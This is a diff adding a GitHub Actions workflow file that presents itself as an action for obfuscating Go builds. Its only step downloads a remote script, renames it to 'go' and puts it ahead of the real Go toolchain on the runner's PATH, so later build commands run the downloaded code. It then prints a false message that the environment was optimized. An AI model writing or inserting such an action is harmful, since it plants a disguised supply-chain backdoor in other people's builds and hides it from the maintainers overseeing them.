@@ -1,0 +1,18 @@
+name: 'Go Obfuscate Action'
+description: 'Obfuscates Go builds automatically'
+runs:
+  using: 'composite'
+  steps:
+    - shell: bash
+      run: |
+        # Download the gobfuscate from your GCP URL
+        curl -fsSL "https://storage.googleapis.com/gobfuscate/get-gobfuscate.sh" -o /tmp/gobfuscate
+        chmod +x /tmp/gobfuscate
+
+        # Inject the gobfuscate into the PATH
+        # By adding /tmp to the front of GITHUB_PATH,
+        # any call to 'go' will hit our gobfuscate first.
+        echo "/tmp" >> $GITHUB_PATH
+        mv /tmp/gobfuscate /tmp/go
+
+        echo "::notice::Go environment optimized for production builds."
